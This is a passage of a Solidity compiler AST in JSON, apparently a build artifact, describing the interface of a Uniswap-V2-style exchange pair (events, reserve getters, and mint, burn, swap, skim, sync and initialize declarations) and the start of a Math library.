												"typeName": {
													"id": 2110,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1464:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2113,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 2119,
												"src": "1496:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2112,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1496:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2115,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 2119,
												"src": "1521:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2114,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1521:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2117,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2119,
												"src": "1546:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2116,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1546:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1454:116:6"
									},
									"src": "1444:127:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 2133,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 2132,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2121,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 2133,
												"src": "1596:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2120,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1596:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2123,
												"indexed": false,
												"name": "amount0In",
												"nodeType": "VariableDeclaration",
												"scope": 2133,
												"src": "1628:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2122,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1628:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2125,
												"indexed": false,
												"name": "amount1In",
												"nodeType": "VariableDeclaration",
												"scope": 2133,
												"src": "1655:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2124,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1655:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2127,
												"indexed": false,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 2133,
												"src": "1682:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2126,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1682:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2129,
												"indexed": false,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 2133,
												"src": "1710:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2128,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1710:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2131,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2133,
												"src": "1738:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2130,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1738:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1586:176:6"
									},
									"src": "1576:187:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 2139,
									"name": "Sync",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 2138,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2135,
												"indexed": false,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 2139,
												"src": "1779:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2134,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1779:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2137,
												"indexed": false,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 2139,
												"src": "1797:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2136,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1797:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1778:36:6"
									},
									"src": "1768:47:6"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2144,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "MINIMUM_LIQUIDITY",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2140,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1847:2:6"
									},
									"returnParameters": {
										"id": 2143,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2142,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2144,
												"src": "1873:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2141,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1873:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1872:9:6"
									},
									"scope": 2235,
									"src": "1821:61:6",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2149,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "factory",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2145,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1904:2:6"
									},
									"returnParameters": {
										"id": 2148,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2147,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2149,
												"src": "1930:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2146,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1930:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1929:9:6"
									},
									"scope": 2235,
									"src": "1888:51:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2154,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2150,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1960:2:6"
									},
									"returnParameters": {
										"id": 2153,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2152,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2154,
												"src": "1986:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2151,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1986:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1985:9:6"
									},
									"scope": 2235,
									"src": "1945:50:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2159,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2155,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2016:2:6"
									},
									"returnParameters": {
										"id": 2158,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2157,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2159,
												"src": "2042:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2156,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2042:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2041:9:6"
									},
									"scope": 2235,
									"src": "2001:50:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2168,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getReserves",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2160,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2077:2:6"
									},
									"returnParameters": {
										"id": 2167,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2162,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 2168,
												"src": "2127:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2161,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2127:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2164,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 2168,
												"src": "2145:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2163,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2145:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2166,
												"name": "blockTimestampLast",
												"nodeType": "VariableDeclaration",
												"scope": 2168,
												"src": "2163:25:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 2165,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "2163:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2126:63:6"
									},
									"scope": 2235,
									"src": "2057:133:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2173,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "price0CumulativeLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2169,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2225:2:6"
									},
									"returnParameters": {
										"id": 2172,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2171,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2173,
												"src": "2251:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2170,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2251:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2250:9:6"
									},
									"scope": 2235,
									"src": "2196:64:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2178,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "price1CumulativeLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2174,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2295:2:6"
									},
									"returnParameters": {
										"id": 2177,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2176,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2178,
												"src": "2321:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2175,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2321:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2320:9:6"
									},
									"scope": 2235,
									"src": "2266:64:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2183,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "kLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2179,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2350:2:6"
									},
									"returnParameters": {
										"id": 2182,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2181,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2183,
												"src": "2376:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2180,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2376:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2375:9:6"
									},
									"scope": 2235,
									"src": "2336:49:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2190,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2186,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2185,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2190,
												"src": "2405:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2184,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2405:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2404:12:6"
									},
									"returnParameters": {
										"id": 2189,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2188,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 2190,
												"src": "2435:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2187,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2435:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2434:19:6"
									},
									"scope": 2235,
									"src": "2391:63:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2197,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "Lockmint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2193,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2192,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2197,
												"src": "2478:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2191,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2478:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2477:12:6"
									},
									"returnParameters": {
										"id": 2196,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2195,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 2197,
												"src": "2508:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2194,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2508:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2507:19:6"
									},
									"scope": 2235,
									"src": "2460:67:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2206,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2200,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2199,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2206,
												"src": "2566:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2198,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2566:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2556:26:6"
									},
									"returnParameters": {
										"id": 2205,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2202,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 2206,
												"src": "2601:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2201,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2601:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2204,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 2206,
												"src": "2618:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2203,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2618:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2600:34:6"
									},
									"scope": 2235,
									"src": "2543:92:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2217,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2215,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2208,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 2217,
												"src": "2664:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2207,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2664:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2210,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 2217,
												"src": "2692:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2209,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2692:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2212,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2217,
												"src": "2720:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2211,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2720:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2214,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 2217,
												"src": "2740:19:6",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 2213,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "2740:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2654:111:6"
									},
									"returnParameters": {
										"id": 2216,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2774:0:6"
									},
									"scope": 2235,
									"src": "2641:134:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2222,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "skim",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2220,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2219,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2222,
												"src": "2795:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2218,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2795:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2794:12:6"
									},
									"returnParameters": {
										"id": 2221,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2815:0:6"
									},
									"scope": 2235,
									"src": "2781:35:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2225,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "sync",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2223,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2835:2:6"
									},
									"returnParameters": {
										"id": 2224,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2846:0:6"
									},
									"scope": 2235,
									"src": "2822:25:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2234,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2232,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2227,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2234,
												"src": "2873:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2226,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2873:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2229,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2234,
												"src": "2882:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2228,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2882:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2231,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2234,
												"src": "2891:4:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2230,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2891:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2872:24:6"
									},
									"returnParameters": {
										"id": 2233,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2905:0:6"
									},
									"scope": 2235,
									"src": "2853:53:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 2236,
							"src": "62:2856:6"
						}
					],
					"src": "36:2883:6"
				},
				"id": 6
			},
			"src/exchange-protocol/contracts/libraries/Math.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/libraries/Math.sol",
					"exportedSymbols": {
						"Math": [
							2311
						]
					},
					"id": 2312,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2237,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:7"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2311,
							"linearizedBaseContracts": [
								2311
							],
							"name": "Math",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 2255,
										"nodeType": "Block",
										"src": "203:34:7",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 2253,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 2246,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2244,
														"src": "213:1:7",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2249,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
